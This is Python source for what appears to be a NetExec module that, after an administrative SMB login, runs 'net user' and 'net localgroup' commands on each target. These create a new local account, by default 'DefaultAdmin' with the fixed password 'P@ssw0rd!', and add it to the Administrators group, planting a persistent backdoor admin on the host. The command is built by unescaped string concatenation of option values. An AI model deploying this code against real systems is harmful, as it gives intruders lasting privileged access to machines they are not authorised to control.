from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "create_user_in_group"
    description = (
        "Create a new user on the target system, with a specified password and group"
    )
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    category = CATEGORY.PRIVILEGE_ESCALATION

    # def __init__(self, context=None, module_options=None):
    #     self.context = context
    #     self.module_options = module_options

    def options(self, context, module_options):
        """
        USER=username of the new admin user (default: DefaultAdmin)
        PASS=password of the new admin user
        GROUP=group to add the new admin user to (default: Administrators)
        """
        self.user = module_options.get("USER") or "DefaultAdmin"
        self.password = module_options.get("PASS") or "P@ssw0rd!"
        self.group = module_options.get("GROUP") or "administrators"

    def on_admin_login(self, context, connection):
        context.log.display(
            f"Creating new user with following values: USER={self.user}, PASS={self.password} in GROUP={self.group}"
        )
        command = (
            "(net user "
            + self.user
            + ' "'
            + self.password
            + '" /add /Y && net localgroup '
            + self.group
            + ' "'
            + self.user
            + '" /add)'
        )

        p = connection.execute(command, True)
        context.log.success(
            f"Successfully created user, and added them to {self.group}"
        )
        context.log.highlight(p)
